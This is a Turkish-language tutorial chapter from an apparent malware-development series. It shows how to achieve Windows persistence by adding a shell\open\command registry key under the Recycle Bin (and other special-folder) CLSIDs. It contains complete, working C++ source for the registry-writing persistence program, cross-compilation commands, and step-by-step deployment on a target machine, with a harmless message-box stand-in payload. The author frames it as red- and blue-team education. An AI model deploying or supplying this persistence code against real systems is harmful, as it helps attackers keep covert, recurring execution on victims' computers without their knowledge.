\newpage
\subsection{87. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 21. Geri Dönüşüm Kutusu, Belgelerim COM uzantı yöneticisi. Basit C++ örneği.}

﷽

![pers](./images/85/2023-01-20_00-28.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımlarda kalıcılık sağlamak için kullanılabilecek en ilginç yöntemlerden biri olan **Geri Dönüşüm Kutusu COM uzantı yöneticisinin değiştirilmesi** yöntemine dayanmaktadır.    

### CLSID listesi

Işletim sistemindeki belirli özel klasörler benzersiz dizelerle tanımlanır:      

- `{20d04fe0-3aea-1069-a2d8-08002b30309d}` - Bilgisayarım     
- `{450d8fba-ad25-11d0-98a8-0800361b1103}` - Belgelerim     
- `{208d2c60-3aea-1069-a2d7-08002b30309d}` - Ağ Bağlantılarım     
- `{1f4de370-d627-11d1-ba4f-00a0c91eedba}` - Ağ Bilgisayarları     
- `{2227a280-3aea-1069-a2de-08002b30309d}` - Yazıcılar ve Fakslar      
- `{645ff040-5081-101b-9f08-00aa002f954e}` - Geri Dönüşüm Kutusu       

`open\command` alt anahtarını CLSID'ye eklemek ve `shell` anahtarına yeni bir komut eklemek, `\command` girişinde depolanan değeri çalıştırır.      

### pratik örnek

Haydi pratik bir örneğe bakalım. Öncelikle, her zamanki gibi, "kötü" uygulamamızı oluşturalım. Basitlik açısından, yine `meow-meow` mesaj kutusu uygulamasını kullanıyoruz (`hack.cpp`):  

```cpp
/*
hack.cpp
windows kalıcılık için kötü uygulama
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Ardından, kalıcılık sağlayan betiği oluşturalım (`pers.cpp`):      

```cpp
/*
pers.cpp
Geri Dönüşüm Kutusu COM uzantı yöneticisi ile
Windows kalıcılığı

yazar: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  HKEY hkR = NULL;

  // shell
  const char* shell = 
  "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell";

  // kötü amaçlı uygulama
  const char* exe = 
  "C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe";

  // anahtar
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)shell, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    res = RegCreateKeyExA(hkey, "open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkR, NULL);
    if (res == ERROR_SUCCESS) {
      // kayıt defteri anahtar değerini güncelle
      // reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"
      // /ve /t REG_SZ /d "hack.exe" /f
      // RegSetValueEx(hkey, (LPCSTR)"open\\command", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
      RegSetValueEx(hkR, NULL, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
      RegCloseKey(hkR);
    // RegCloseKey(hkey);
    }
    RegCloseKey(hkey);
  }
  return 0;
}
```

Görebildiğiniz gibi, mantık oldukça basit.    

### demo

Haydi her şeyi adım adım inceleyelim. Öncelikle, Kayıt Defteri'ni kontrol edelim:      

```powershell
reg query 
"HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell" 
/s
```

![pers](./images/85/2023-01-19_23-39.png){width="80%"}    

Ardından, sıldırgan makinesinde (`kali`) "kötü amaçlı yazılımımızı" derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/85/2023-01-19_23-16.png){width="80%"}    

Ve doğruluğunu kontrol etmek için `hack.exe`'yi hedef makinede (örneğin benim durumumda `Windows 10 x64`) çalıştıralım:    

```powershell
.\hack.exe
```

![pers](./images/85/2023-01-19_23-49.png){width="80%"}    

Gördüğünüz gibi, "kötü amaçlı yazılımımız" sorunsuz çalışıyor.    

Sonraki adımda, sıldırgan makinesinde kalıcılık betiğini derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/85/2023-01-19_23-35.png){width="80%"}    

Son olarak, bu kalıcılık betiğini hedef makinede çalıştıralım ve Kayıt Defteri'ni tekrar kontrol edelim:     

```powershell
.\pers.exe
reg query "HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell" /s
```

![pers](./images/85/2023-01-20_00-19.png){width="80%"}    

Gördüğünüz gibi, alt anahtar eklendi ve anahtar değeri ayarlandı.    

Ardından, Geri Dönüşüm Kutusu'nu açmayı deneyelim:    

![pers](./images/85/2023-01-20_00-25.png){width="80%"}    

![pers](./images/85/2023-01-20_00-25_1.png){width="80%"}    

Eğer `ProcessExplorer`'i açar ve `hack.exe` özelliklerini incelersek:     

![pers](./images/85/2023-01-20_06-59.png){width="80%"}    

Ana sürecin `explorer.exe (1680)` olduğunu fark edebiliriz.     

Mükemmel! =^..^=

### listedeki başka bir CLSID ne olacak?    

Kalıcılık betiğinde küçük bir değişiklik yaptım:      

```cpp
/*
pers.cpp
Geri Dönüşüm Kutusu COM uzantı yöneticisi ile
Windows kalıcılığı

yazar: @cocomelonc
https://cocomelonc.github.io/malware/2023/01/20/malware-pers-21.html
*/
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  HKEY hkR = NULL;

  // shell
  const char* shell = 
  "SOFTWARE\\Classes\\CLSID\\{450d8fba-ad25-11d0-98a8-0800361b1103}\\shell";

  // kötü amaçlı uygulama
  const char* exe = 
  "C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe";

  // anahtar
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)shell, 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    res = RegCreateKeyExA(hkey, "open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkR, NULL);
    if (res == ERROR_SUCCESS) {
      // kayıt defteri anahtar değerini güncelle
      // reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\
      // {450d8fba-ad25-11d0-98a8-0800361b1103}\shell\open\command"
      // /ve /t REG_SZ /d "hack.exe" /f
      // RegSetValueEx(hkey, (LPCSTR)"open\\command", 0, REG_SZ, 
      // (unsigned char*)exe, strlen(exe));
      RegSetValueEx(hkR, NULL, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
      RegCloseKey(hkR);
    // RegCloseKey(hkey);
    }
    RegCloseKey(hkey);
  }
  return 0;
}

```

Derleyin ve hedef makinede çalıştırın:      

```powershell
.\pers.exe
reg query 
"HKLM\SOFTWARE\Classes\CLSID\
{450d8fba-ad25-11d0-98a8-0800361b1103}\shell" /s
```

![pers](./images/85/2023-01-20_07-09.png){width="80%"}    

Ancak... Windows 10'da benim için çalışmıyor, çünkü bu aptal Başlat menüsünü kullanıyorlar, Masaüstü özelliğinde `Belgelerim` klasörünü bulamıyorum.    

Ayrıca, bu yöntemi `Windows 7 x86` makinesinde başka bir CLSID ile denemeye çalıştım. `Bilgisayarım` klasörü için çalıştı.     

![pers](./images/85/2023-01-20_07-22.png){width="80%"}    

![pers](./images/85/2023-01-20_07-35.png){width="80%"}    

Bu yöntemi herhangi bir APT grubunun veya kötü amaçlı yazılım ailesinin kullanıp kullanmadığını bilmiyorum.     

Umarım bu gönderi, mavi takım üyelerinin bu teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.    

[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-01-20-malware-pers-21)     
